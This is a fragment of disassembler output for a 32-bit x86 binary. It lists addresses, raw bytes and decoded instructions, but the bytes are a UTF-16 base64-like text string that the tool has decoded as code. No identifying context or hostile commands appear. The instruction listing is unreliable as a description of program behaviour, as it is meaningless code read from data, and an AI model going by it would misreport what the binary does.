  409c4d:	00 6a 00             	add    %ch,0x0(%edx)
  409c50:	47                   	inc    %edi
  409c51:	00 71 00             	add    %dh,0x0(%ecx)
  409c54:	48                   	dec    %eax
  409c55:	00 5a 00             	add    %bl,0x0(%edx)
  409c58:	68 00 57 00 39       	push   $0x39005700
  409c5d:	00 4b 00             	add    %cl,0x0(%ebx)
  409c60:	4a                   	dec    %edx
  409c61:	00 78 00             	add    %bh,0x0(%eax)
  409c64:	4b                   	dec    %ebx
  409c65:	00 4b 00             	add    %cl,0x0(%ebx)
  409c68:	6b 00 57             	imul   $0x57,(%eax),%eax
  409c6b:	00 61 00             	add    %ah,0x0(%ecx)
  409c6e:	57                   	push   %edi
  409c6f:	00 6e 00             	add    %ch,0x0(%esi)
  409c72:	45                   	inc    %ebp
  409c73:	00 56 00             	add    %dl,0x0(%esi)
  409c76:	54                   	push   %esp
  409c77:	00 65 00             	add    %ah,0x0(%ebp)
  409c7a:	74 00                	je     0x409c7c
  409c7c:	61                   	popa
  409c7d:	00 47 00             	add    %al,0x0(%edi)
  409c80:	46                   	inc    %esi
  409c81:	00 39                	add    %bh,(%ecx)
  409c83:	00 6b 00             	add    %ch,0x0(%ebx)
  409c86:	58                   	pop    %eax
  409c87:	00 38                	add    %bh,(%eax)
  409c89:	00 4a 00             	add    %cl,0x0(%edx)
  409c8c:	62 00                	bound  %eax,(%eax)
  409c8e:	2b 00                	sub    (%eax),%eax
  409c90:	70 00                	jo     0x409c92
  409c92:	31 00                	xor    %eax,(%eax)
  409c94:	41                   	inc    %ecx
  409c95:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  409c99:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  409c9d:	00 32                	add    %dh,(%edx)
  409c9f:	00 47 00             	add    %al,0x0(%edi)
  409ca2:	47                   	inc    %edi
  409ca3:	00 37                	add    %dh,(%edi)
  409ca5:	00 4a 00             	add    %cl,0x0(%edx)
  409ca8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ca9:	00 4a 00             	add    %cl,0x0(%edx)
  409cac:	37                   	aaa
  409cad:	00 4f 00             	add    %cl,0x0(%edi)
  409cb0:	74 00                	je     0x409cb2
  409cb2:	34 00                	xor    $0x0,%al
  409cb4:	53                   	push   %ebx
  409cb5:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  409cb9:	00 63 00             	add    %ah,0x0(%ebx)
  409cbc:	65 00 2b             	add    %ch,%gs:(%ebx)
  409cbf:	00 70 00             	add    %dh,0x0(%eax)
  409cc2:	63 00                	arpl   %eax,(%eax)
  409cc4:	4b                   	dec    %ebx
  409cc5:	00 61 00             	add    %ah,0x0(%ecx)
  409cc8:	42                   	inc    %edx
  409cc9:	00 4e 00             	add    %cl,0x0(%esi)
  409ccc:	62 00                	bound  %eax,(%eax)
  409cce:	30 00                	xor    %al,(%eax)
  409cd0:	7a 00                	jp     0x409cd2
  409cd2:	57                   	push   %edi
  409cd3:	00 2b                	add    %ch,(%ebx)
  409cd5:	00 57 00             	add    %dl,0x0(%edi)
  409cd8:	47                   	inc    %edi
  409cd9:	00 7a 00             	add    %bh,0x0(%edx)
  409cdc:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  409cdf:	00 6a 00             	add    %ch,0x0(%edx)
  409ce2:	72 00                	jb     0x409ce4
  409ce4:	74 00                	je     0x409ce6
  409ce6:	58                   	pop    %eax
  409ce7:	00 66 00             	add    %ah,0x0(%esi)
  409cea:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409cee:	4c                   	dec    %esp
  409cef:	00 63 00             	add    %ah,0x0(%ebx)
  409cf2:	54                   	push   %esp
  409cf3:	00 59 00             	add    %bl,0x0(%ecx)
  409cf6:	69 00 6f 00 34 00    	imul   $0x34006f,(%eax),%eax
  409cfc:	6e                   	outsb  %ds:(%esi),(%dx)
  409cfd:	00 35 00 44 00 4c    	add    %dh,0x4c004400
  409d03:	00 2b                	add    %ch,(%ebx)
  409d05:	00 6d 00             	add    %ch,0x0(%ebp)
  409d08:	4c                   	dec    %esp
  409d09:	00 43 00             	add    %al,0x0(%ebx)
  409d0c:	6c                   	insb   (%dx),%es:(%edi)
  409d0d:	00 50 00             	add    %dl,0x0(%eax)
  409d10:	57                   	push   %edi
  409d11:	00 6a 00             	add    %ch,0x0(%edx)
  409d14:	49                   	dec    %ecx
  409d15:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  409d19:	00 7a 00             	add    %bh,0x0(%edx)
  409d1c:	6b 00 30             	imul   $0x30,(%eax),%eax
  409d1f:	00 2b                	add    %ch,(%ebx)
  409d21:	00 79 00             	add    %bh,0x0(%ecx)
  409d24:	50                   	push   %eax
  409d25:	00 53 00             	add    %dl,0x0(%ebx)
  409d28:	6a 00                	push   $0x0
  409d2a:	39 00                	cmp    %eax,(%eax)
  409d2c:	6b 00 39             	imul   $0x39,(%eax),%eax
  409d2f:	00 48 00             	add    %cl,0x0(%eax)
  409d32:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  409d36:	69 00 2f 00 6c 00    	imul   $0x6c002f,(%eax),%eax
  409d3c:	71 00                	jno    0x409d3e
  409d3e:	42                   	inc    %edx
  409d3f:	00 75 00             	add    %dh,0x0(%ebp)
  409d42:	7a 00                	jp     0x409d44
  409d44:	35 00 73 00 59       	xor    $0x59007300,%eax
  409d49:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  409d4d:	00 53 00             	add    %dl,0x0(%ebx)
  409d50:	48                   	dec    %eax
  409d51:	00 48 00             	add    %cl,0x0(%eax)
  409d54:	77 00                	ja     0x409d56
  409d56:	35 00 63 00 2f       	xor    $0x2f006300,%eax
  409d5b:	00 67 00             	add    %ah,0x0(%edi)
  409d5e:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  409d62:	4d                   	dec    %ebp
  409d63:	00 66 00             	add    %ah,0x0(%esi)
  409d66:	41                   	inc    %ecx
  409d67:	00 56 00             	add    %dl,0x0(%esi)
  409d6a:	77 00                	ja     0x409d6c
  409d6c:	72 00                	jb     0x409d6e
  409d6e:	4d                   	dec    %ebp
  409d6f:	00 6d 00             	add    %ch,0x0(%ebp)
  409d72:	33 00                	xor    (%eax),%eax
  409d74:	39 00                	cmp    %eax,(%eax)
  409d76:	30 00                	xor    %al,(%eax)
  409d78:	43                   	inc    %ebx
  409d79:	00 31                	add    %dh,(%ecx)
  409d7b:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  409d7f:	00 78 00             	add    %bh,0x0(%eax)
  409d82:	39 00                	cmp    %eax,(%eax)
  409d84:	63 00                	arpl   %eax,(%eax)
  409d86:	31 00                	xor    %eax,(%eax)
  409d88:	35 00 53 00 67       	xor    $0x67005300,%eax
  409d8d:	00 62 00             	add    %ah,0x0(%edx)
  409d90:	38 00                	cmp    %al,(%eax)
  409d92:	73 00                	jae    0x409d94
  409d94:	5a                   	pop    %edx
  409d95:	00 32                	add    %dh,(%edx)
  409d97:	00 6f 00             	add    %ch,0x0(%edi)
  409d9a:	4e                   	dec    %esi
  409d9b:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  409d9f:	00 48 00             	add    %cl,0x0(%eax)
  409da2:	78 00                	js     0x409da4
  409da4:	43                   	inc    %ebx
  409da5:	00 45 00             	add    %al,0x0(%ebp)
  409da8:	75 00                	jne    0x409daa
  409daa:	30 00                	xor    %al,(%eax)
  409dac:	31 00                	xor    %eax,(%eax)
  409dae:	6b 00 70             	imul   $0x70,(%eax),%eax
  409db1:	00 32                	add    %dh,(%edx)
  409db3:	00 55 00             	add    %dl,0x0(%ebp)
  409db6:	32 00                	xor    (%eax),%al
  409db8:	30 00                	xor    %al,(%eax)
  409dba:	46                   	inc    %esi
  409dbb:	00 2b                	add    %ch,(%ebx)
  409dbd:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409dc1:	00 56 00             	add    %dl,0x0(%esi)
  409dc4:	32 00                	xor    (%eax),%al
  409dc6:	78 00                	js     0x409dc8
  409dc8:	72 00                	jb     0x409dca
  409dca:	4a                   	dec    %edx
  409dcb:	00 69 00             	add    %ch,0x0(%ecx)
  409dce:	38 00                	cmp    %al,(%eax)
  409dd0:	79 00                	jns    0x409dd2
  409dd2:	35 00 4c 00 73       	xor    $0x73004c00,%eax
  409dd7:	00 62 00             	add    %ah,0x0(%edx)
  409dda:	4c                   	dec    %esp
  409ddb:	00 57 00             	add    %dl,0x0(%edi)
  409dde:	66 00 4c 00 7a       	data16 add %cl,0x7a(%eax,%eax,1)
  409de3:	00 77 00             	add    %dh,0x0(%edi)
  409de6:	4d                   	dec    %ebp
  409de7:	00 4e 00             	add    %cl,0x0(%esi)
  409dea:	71 00                	jno    0x409dec
  409dec:	79 00                	jns    0x409dee
  409dee:	58                   	pop    %eax
  409def:	00 30                	add    %dh,(%eax)
  409df1:	00 6f 00             	add    %ch,0x0(%edi)
  409df4:	5a                   	pop    %edx
  409df5:	00 41 00             	add    %al,0x0(%ecx)
  409df8:	55                   	push   %ebp
  409df9:	00 72 00             	add    %dh,0x0(%edx)
  409dfc:	37                   	aaa
  409dfd:	00 30                	add    %dh,(%eax)
  409dff:	00 68 00             	add    %ch,0x0(%eax)
  409e02:	6e                   	outsb  %ds:(%esi),(%dx)
  409e03:	00 42 00             	add    %al,0x0(%edx)
  409e06:	59                   	pop    %ecx
  409e07:	00 51 00             	add    %dl,0x0(%ecx)
  409e0a:	2b 00                	sub    (%eax),%eax
  409e0c:	37                   	aaa
  409e0d:	00 7a 00             	add    %bh,0x0(%edx)
  409e10:	55                   	push   %ebp
  409e11:	00 32                	add    %dh,(%edx)
  409e13:	00 37                	add    %dh,(%edi)
  409e15:	00 70 00             	add    %dh,0x0(%eax)
  409e18:	44                   	inc    %esp
  409e19:	00 43 00             	add    %al,0x0(%ebx)
  409e1c:	49                   	dec    %ecx
  409e1d:	00 79 00             	add    %bh,0x0(%ecx)
  409e20:	38 00                	cmp    %al,(%eax)
  409e22:	70 00                	jo     0x409e24
  409e24:	35 00 6e 00 72       	xor    $0x72006e00,%eax
  409e29:	00 39                	add    %bh,(%ecx)
  409e2b:	00 7a 00             	add    %bh,0x0(%edx)
  409e2e:	73 00                	jae    0x409e30
  409e30:	34 00                	xor    $0x0,%al
  409e32:	56                   	push   %esi
  409e33:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  409e37:	00 78 00             	add    %bh,0x0(%eax)
  409e3a:	61                   	popa
  409e3b:	00 43 00             	add    %al,0x0(%ebx)
  409e3e:	33 00                	xor    (%eax),%eax
  409e40:	58                   	pop    %eax
  409e41:	00 46 00             	add    %al,0x0(%esi)
  409e44:	4f                   	dec    %edi
  409e45:	00 42 00             	add    %al,0x0(%edx)
  409e48:	31 00                	xor    %eax,(%eax)
  409e4a:	78 00                	js     0x409e4c
  409e4c:	52                   	push   %edx
  409e4d:	00 38                	add    %bh,(%eax)
  409e4f:	00 59 00             	add    %bl,0x0(%ecx)
  409e52:	4a                   	dec    %edx
  409e53:	00 56 00             	add    %dl,0x0(%esi)
  409e56:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  409e59:	00 2b                	add    %ch,(%ebx)
  409e5b:	00 59 00             	add    %bl,0x0(%ecx)
  409e5e:	74 00                	je     0x409e60
  409e60:	31 00                	xor    %eax,(%eax)
  409e62:	43                   	inc    %ebx
  409e63:	00 5a 00             	add    %bl,0x0(%edx)
  409e66:	4d                   	dec    %ebp
  409e67:	00 6f 00             	add    %ch,0x0(%edi)
  409e6a:	62 00                	bound  %eax,(%eax)
  409e6c:	69 00 2b 00 36 00    	imul   $0x36002b,(%eax),%eax
  409e72:	30 00                	xor    %al,(%eax)
  409e74:	33 00                	xor    (%eax),%eax
  409e76:	58                   	pop    %eax
  409e77:	00 65 00             	add    %ah,0x0(%ebp)
  409e7a:	42                   	inc    %edx
  409e7b:	00 65 00             	add    %ah,0x0(%ebp)
  409e7e:	30 00                	xor    %al,(%eax)
  409e80:	43                   	inc    %ebx
  409e81:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e84:	57                   	push   %edi
  409e85:	00 6d 00             	add    %ch,0x0(%ebp)
  409e88:	5a                   	pop    %edx
  409e89:	00 61 00             	add    %ah,0x0(%ecx)
  409e8c:	6a 00                	push   $0x0
  409e8e:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  409e92:	34 00                	xor    $0x0,%al
  409e94:	45                   	inc    %ebp
  409e95:	00 4a 00             	add    %cl,0x0(%edx)
  409e98:	44                   	inc    %esp
  409e99:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  409e9d:	00 57 00             	add    %dl,0x0(%edi)
  409ea0:	39 00                	cmp    %eax,(%eax)
  409ea2:	73 00                	jae    0x409ea4
  409ea4:	6e                   	outsb  %ds:(%esi),(%dx)
  409ea5:	00 5a 00             	add    %bl,0x0(%edx)
  409ea8:	49                   	dec    %ecx
  409ea9:	00 6a 00             	add    %ch,0x0(%edx)
  409eac:	42                   	inc    %edx
  409ead:	00 38                	add    %bh,(%eax)
  409eaf:	00 6f 00             	add    %ch,0x0(%edi)
  409eb2:	7a 00                	jp     0x409eb4
  409eb4:	76 00                	jbe    0x409eb6
  409eb6:	58                   	pop    %eax
  409eb7:	00 63 00             	add    %ah,0x0(%ebx)
  409eba:	30 00                	xor    %al,(%eax)
  409ebc:	6d                   	insl   (%dx),%es:(%edi)
  409ebd:	00 4a 00             	add    %cl,0x0(%edx)
  409ec0:	42                   	inc    %edx
  409ec1:	00 42 00             	add    %al,0x0(%edx)
  409ec4:	51                   	push   %ecx
  409ec5:	00 78 00             	add    %bh,0x0(%eax)
  409ec8:	51                   	push   %ecx
  409ec9:	00 63 00             	add    %ah,0x0(%ebx)
  409ecc:	55                   	push   %ebp
  409ecd:	00 61 00             	add    %ah,0x0(%ecx)
  409ed0:	7a 00                	jp     0x409ed2
  409ed2:	67 00 6d 00          	add    %ch,0x0(%di)
  409ed6:	34 00                	xor    $0x0,%al
  409ed8:	4a                   	dec    %edx
  409ed9:	00 47 00             	add    %al,0x0(%edi)
  409edc:	39 00                	cmp    %eax,(%eax)
  409ede:	42                   	inc    %edx
  409edf:	00 32                	add    %dh,(%edx)
  409ee1:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  409ee5:	00 52 00             	add    %dl,0x0(%edx)
  409ee8:	2b 00                	sub    (%eax),%eax
  409eea:	7a 00                	jp     0x409eec
  409eec:	73 00                	jae    0x409eee
  409eee:	4e                   	dec    %esi
  409eef:	00 45 00             	add    %al,0x0(%ebp)
  409ef2:	33 00                	xor    (%eax),%eax
  409ef4:	2b 00                	sub    (%eax),%eax
  409ef6:	2f                   	das
  409ef7:	00 62 00             	add    %ah,0x0(%edx)
  409efa:	2f                   	das
  409efb:	00 48 00             	add    %cl,0x0(%eax)
  409efe:	35 00 57 00 68       	xor    $0x68005700,%eax
  409f03:	00 68 00             	add    %ch,0x0(%eax)
  409f06:	55                   	push   %ebp
  409f07:	00 66 00             	add    %ah,0x0(%esi)
  409f0a:	31 00                	xor    %eax,(%eax)
  409f0c:	6d                   	insl   (%dx),%es:(%edi)
  409f0d:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  409f11:	00 51 00             	add    %dl,0x0(%ecx)
  409f14:	75 00                	jne    0x409f16
  409f16:	5a                   	pop    %edx
  409f17:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f1a:	67 00 6f 00          	add    %ch,0x0(%bx)
  409f1e:	62 00                	bound  %eax,(%eax)
  409f20:	48                   	dec    %eax
  409f21:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  409f25:	00 62 00             	add    %ah,0x0(%edx)
  409f28:	41                   	inc    %ecx
  409f29:	00 4f 00             	add    %cl,0x0(%edi)
  409f2c:	61                   	popa
  409f2d:	00 62 00             	add    %ah,0x0(%edx)
  409f30:	32 00                	xor    (%eax),%al
  409f32:	51                   	push   %ecx
  409f33:	00 67 00             	add    %ah,0x0(%edi)
  409f36:	68 00 49 00 73       	push   $0x73004900
  409f3b:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  409f3f:	00 48 00             	add    %cl,0x0(%eax)
  409f42:	31 00                	xor    %eax,(%eax)
  409f44:	32 00                	xor    (%eax),%al
  409f46:	33 00                	xor    (%eax),%eax
  409f48:	56                   	push   %esi
  409f49:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
  409f4d:	00 4f 00             	add    %cl,0x0(%edi)
  409f50:	56                   	push   %esi
  409f51:	00 4f 00             	add    %cl,0x0(%edi)
  409f54:	33 00                	xor    (%eax),%eax
  409f56:	35 00 6a 00 32       	xor    $0x32006a00,%eax
  409f5b:	00 6f 00             	add    %ch,0x0(%edi)
  409f5e:	50                   	push   %eax
  409f5f:	00 52 00             	add    %dl,0x0(%edx)
  409f62:	52                   	push   %edx
  409f63:	00 46 00             	add    %al,0x0(%esi)
  409f66:	2b 00                	sub    (%eax),%eax
  409f68:	73 00                	jae    0x409f6a
  409f6a:	38 00                	cmp    %al,(%eax)
  409f6c:	6f                   	outsl  %ds:(%esi),(%dx)
  409f6d:	00 46 00             	add    %al,0x0(%esi)
  409f70:	4e                   	dec    %esi
  409f71:	00 70 00             	add    %dh,0x0(%eax)
  409f74:	59                   	pop    %ecx
  409f75:	00 39                	add    %bh,(%ecx)
  409f77:	00 69 00             	add    %ch,0x0(%ecx)
  409f7a:	57                   	push   %edi
  409f7b:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  409f7f:	00 45 00             	add    %al,0x0(%ebp)
  409f82:	70 00                	jo     0x409f84
  409f84:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  409f88:	35 00 59 00 56       	xor    $0x56005900,%eax
  409f8d:	00 4f 00             	add    %cl,0x0(%edi)
  409f90:	75 00                	jne    0x409f92
  409f92:	73 00                	jae    0x409f94
  409f94:	46                   	inc    %esi
  409f95:	00 37                	add    %dh,(%edi)
  409f97:	00 6e 00             	add    %ch,0x0(%esi)
  409f9a:	32 00                	xor    (%eax),%al
  409f9c:	74 00                	je     0x409f9e
  409f9e:	48                   	dec    %eax
  409f9f:	00 55 00             	add    %dl,0x0(%ebp)
  409fa2:	53                   	push   %ebx
  409fa3:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  409fa7:	00 6d 00             	add    %ch,0x0(%ebp)
  409faa:	63 00                	arpl   %eax,(%eax)
  409fac:	35 00 6d 00 44       	xor    $0x44006d00,%eax
  409fb1:	00 70 00             	add    %dh,0x0(%eax)
  409fb4:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  409fb8:	38 00                	cmp    %al,(%eax)
  409fba:	7a 00                	jp     0x409fbc
  409fbc:	6e                   	outsb  %ds:(%esi),(%dx)
  409fbd:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  409fc1:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  409fc5:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  409fc9:	00 69 00             	add    %ch,0x0(%ecx)
  409fcc:	79 00                	jns    0x409fce
  409fce:	75 00                	jne    0x409fd0
  409fd0:	45                   	inc    %ebp
  409fd1:	00 63 00             	add    %ah,0x0(%ebx)
  409fd4:	33 00                	xor    (%eax),%eax
  409fd6:	61                   	popa
  409fd7:	00 42 00             	add    %al,0x0(%edx)
  409fda:	57                   	push   %edi
  409fdb:	00 5a 00             	add    %bl,0x0(%edx)
  409fde:	75 00                	jne    0x409fe0
  409fe0:	76 00                	jbe    0x409fe2
  409fe2:	6d                   	insl   (%dx),%es:(%edi)
  409fe3:	00 68 00             	add    %ch,0x0(%eax)
  409fe6:	53                   	push   %ebx
  409fe7:	00 7a 00             	add    %bh,0x0(%edx)
  409fea:	68 00 37 00 38       	push   $0x38003700
  409fef:	00 4d 00             	add    %cl,0x0(%ebp)
  409ff2:	32 00                	xor    (%eax),%al
  409ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  409ff5:	00 52 00             	add    %dl,0x0(%edx)
  409ff8:	36 00 31             	add    %dh,%ss:(%ecx)
  409ffb:	00 45 00             	add    %al,0x0(%ebp)
  409ffe:	2f                   	das
  409fff:	00 46 00             	add    %al,0x0(%esi)
  40a002:	35 00 77 00 6c       	xor    $0x6c007700,%eax
  40a007:	00 70 00             	add    %dh,0x0(%eax)
  40a00a:	34 00                	xor    $0x0,%al
  40a00c:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a00f:	00 32                	add    %dh,(%edx)
  40a011:	00 53 00             	add    %dl,0x0(%ebx)
  40a014:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40a018:	6a 00                	push   $0x0
  40a01a:	48                   	dec    %eax
  40a01b:	00 57 00             	add    %dl,0x0(%edi)
  40a01e:	63 00                	arpl   %eax,(%eax)
  40a020:	4d                   	dec    %ebp
  40a021:	00 37                	add    %dh,(%edi)
  40a023:	00 32                	add    %dh,(%edx)
  40a025:	00 41 00             	add    %al,0x0(%ecx)
  40a028:	49                   	dec    %ecx
  40a029:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a02c:	77 00                	ja     0x40a02e
  40a02e:	58                   	pop    %eax
  40a02f:	00 75 00             	add    %dh,0x0(%ebp)
  40a032:	43                   	inc    %ebx
  40a033:	00 2f                	add    %ch,(%edi)
  40a035:	00 2f                	add    %ch,(%edi)
  40a037:	00 56 00             	add    %dl,0x0(%esi)
  40a03a:	47                   	inc    %edi
  40a03b:	00 6a 00             	add    %ch,0x0(%edx)
  40a03e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a03f:	00 55 00             	add    %dl,0x0(%ebp)
  40a042:	4b                   	dec    %ebx
  40a043:	00 6f 00             	add    %ch,0x0(%edi)
  40a046:	4d                   	dec    %ebp
  40a047:	00 36                	add    %dh,(%esi)
  40a049:	00 75 00             	add    %dh,0x0(%ebp)
  40a04c:	4c                   	dec    %esp
  40a04d:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40a051:	00 77 00             	add    %dh,0x0(%edi)
  40a054:	30 00                	xor    %al,(%eax)
  40a056:	4e                   	dec    %esi
  40a057:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40a05b:	00 69 00             	add    %ch,0x0(%ecx)
  40a05e:	4b                   	dec    %ebx
  40a05f:	00 7a 00             	add    %bh,0x0(%edx)
  40a062:	64 00 38             	add    %bh,%fs:(%eax)
  40a065:	00 4f 00             	add    %cl,0x0(%edi)
  40a068:	4e                   	dec    %esi
  40a069:	00 79 00             	add    %bh,0x0(%ecx)
  40a06c:	74 00                	je     0x40a06e
  40a06e:	55                   	push   %ebp
  40a06f:	00 4f 00             	add    %cl,0x0(%edi)
  40a072:	32 00                	xor    (%eax),%al
  40a074:	4a                   	dec    %edx
  40a075:	00 75 00             	add    %dh,0x0(%ebp)
  40a078:	4e                   	dec    %esi
  40a079:	00 6b 00             	add    %ch,0x0(%ebx)
  40a07c:	43                   	inc    %ebx
  40a07d:	00 77 00             	add    %dh,0x0(%edi)
  40a080:	5a                   	pop    %edx
  40a081:	00 73 00             	add    %dh,0x0(%ebx)
  40a084:	73 00                	jae    0x40a086
  40a086:	4d                   	dec    %ebp
  40a087:	00 45 00             	add    %al,0x0(%ebp)
  40a08a:	62 00                	bound  %eax,(%eax)
  40a08c:	61                   	popa
  40a08d:	00 52 00             	add    %dl,0x0(%edx)
  40a090:	47                   	inc    %edi
  40a091:	00 6e 00             	add    %ch,0x0(%esi)
  40a094:	6c                   	insb   (%dx),%es:(%edi)
  40a095:	00 76 00             	add    %dh,0x0(%esi)
  40a098:	70 00                	jo     0x40a09a
  40a09a:	61                   	popa
  40a09b:	00 33                	add    %dh,(%ebx)
  40a09d:	00 47 00             	add    %al,0x0(%edi)
  40a0a0:	67 00 36 00 75       	add    %dh,0x7500
  40a0a5:	00 77 00             	add    %dh,0x0(%edi)
  40a0a8:	54                   	push   %esp
  40a0a9:	00 51 00             	add    %dl,0x0(%ecx)
  40a0ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0ad:	00 6a 00             	add    %ch,0x0(%edx)
  40a0b0:	50                   	push   %eax
  40a0b1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0b5:	00 43 00             	add    %al,0x0(%ebx)
  40a0b8:	63 00                	arpl   %eax,(%eax)
  40a0ba:	37                   	aaa
  40a0bb:	00 55 00             	add    %dl,0x0(%ebp)
  40a0be:	30 00                	xor    %al,(%eax)
  40a0c0:	78 00                	js     0x40a0c2
  40a0c2:	72 00                	jb     0x40a0c4
  40a0c4:	69 00 58 00 43 00    	imul   $0x430058,(%eax),%eax
  40a0ca:	68 00 42 00 39       	push   $0x39004200
  40a0cf:	00 70 00             	add    %dh,0x0(%eax)
  40a0d2:	6c                   	insb   (%dx),%es:(%edi)
  40a0d3:	00 73 00             	add    %dh,0x0(%ebx)
  40a0d6:	31 00                	xor    %eax,(%eax)
  40a0d8:	48                   	dec    %eax
  40a0d9:	00 47 00             	add    %al,0x0(%edi)
  40a0dc:	4e                   	dec    %esi
  40a0dd:	00 30                	add    %dh,(%eax)
  40a0df:	00 5a 00             	add    %bl,0x0(%edx)
  40a0e2:	68 00 4d 00 63       	push   $0x63004d00
  40a0e7:	00 59 00             	add    %bl,0x0(%ecx)
  40a0ea:	64 00 64 00 75       	add    %ah,%fs:0x75(%eax,%eax,1)
  40a0ef:	00 7a 00             	add    %bh,0x0(%edx)
  40a0f2:	33 00                	xor    (%eax),%eax
  40a0f4:	4c                   	dec    %esp
  40a0f5:	00 70 00             	add    %dh,0x0(%eax)
  40a0f8:	57                   	push   %edi
  40a0f9:	00 67 00             	add    %ah,0x0(%edi)
  40a0fc:	31 00                	xor    %eax,(%eax)
  40a0fe:	2f                   	das
  40a0ff:	00 78 00             	add    %bh,0x0(%eax)
  40a102:	76 00                	jbe    0x40a104
  40a104:	62 00                	bound  %eax,(%eax)
  40a106:	75 00                	jne    0x40a108
  40a108:	69 00 52 00 4d 00    	imul   $0x4d0052,(%eax),%eax
  40a10e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a10f:	00 66 00             	add    %ah,0x0(%esi)
  40a112:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a116:	4c                   	dec    %esp
  40a117:	00 72 00             	add    %dh,0x0(%edx)
  40a11a:	32 00                	xor    (%eax),%al
  40a11c:	73 00                	jae    0x40a11e
  40a11e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a11f:	00 35 00 51 00 38    	add    %dh,0x38005100
  40a125:	00 43 00             	add    %al,0x0(%ebx)
  40a128:	6c                   	insb   (%dx),%es:(%edi)
  40a129:	00 39                	add    %bh,(%ecx)
  40a12b:	00 6f 00             	add    %ch,0x0(%edi)
  40a12e:	2f                   	das
  40a12f:	00 73 00             	add    %dh,0x0(%ebx)
  40a132:	6f                   	outsl  %ds:(%esi),(%dx)
  40a133:	00 63 00             	add    %ah,0x0(%ebx)
  40a136:	41                   	inc    %ecx
  40a137:	00 6a 00             	add    %ch,0x0(%edx)
  40a13a:	53                   	push   %ebx
  40a13b:	00 63 00             	add    %ah,0x0(%ebx)
  40a13e:	58                   	pop    %eax
  40a13f:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40a143:	00 55 00             	add    %dl,0x0(%ebp)
  40a146:	51                   	push   %ecx
  40a147:	00 55 00             	add    %dl,0x0(%ebp)
  40a14a:	53                   	push   %ebx
  40a14b:	00 46 00             	add    %al,0x0(%esi)
  40a14e:	55                   	push   %ebp
  40a14f:	00 48 00             	add    %cl,0x0(%eax)
  40a152:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a155:	00 6e 00             	add    %ch,0x0(%esi)
  40a158:	6f                   	outsl  %ds:(%esi),(%dx)
  40a159:	00 30                	add    %dh,(%eax)
  40a15b:	00 48 00             	add    %cl,0x0(%eax)
  40a15e:	51                   	push   %ecx
  40a15f:	00 71 00             	add    %dh,0x0(%ecx)
  40a162:	2f                   	das
  40a163:	00 59 00             	add    %bl,0x0(%ecx)
  40a166:	67 00 44 00          	add    %al,0x0(%si)
  40a16a:	79 00                	jns    0x40a16c
  40a16c:	4b                   	dec    %ebx
  40a16d:	00 56 00             	add    %dl,0x0(%esi)
  40a170:	75 00                	jne    0x40a172
  40a172:	75 00                	jne    0x40a174
  40a174:	76 00                	jbe    0x40a176
  40a176:	61                   	popa
  40a177:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40a17b:	00 4a 00             	add    %cl,0x0(%edx)
  40a17e:	4c                   	dec    %esp
  40a17f:	00 6a 00             	add    %ch,0x0(%edx)
  40a182:	58                   	pop    %eax
  40a183:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a186:	76 00                	jbe    0x40a188
  40a188:	44                   	inc    %esp
  40a189:	00 32                	add    %dh,(%edx)
  40a18b:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40a18f:	00 4f 00             	add    %cl,0x0(%edi)
  40a192:	49                   	dec    %ecx
  40a193:	00 52 00             	add    %dl,0x0(%edx)
  40a196:	64 00 39             	add    %bh,%fs:(%ecx)
  40a199:	00 2b                	add    %ch,(%ebx)
  40a19b:	00 47 00             	add    %al,0x0(%edi)
  40a19e:	32 00                	xor    (%eax),%al
  40a1a0:	51                   	push   %ecx
  40a1a1:	00 33                	add    %dh,(%ebx)
  40a1a3:	00 55 00             	add    %dl,0x0(%ebp)
  40a1a6:	7a 00                	jp     0x40a1a8
  40a1a8:	4d                   	dec    %ebp
  40a1a9:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40a1ad:	00 4a 00             	add    %cl,0x0(%edx)
  40a1b0:	45                   	inc    %ebp
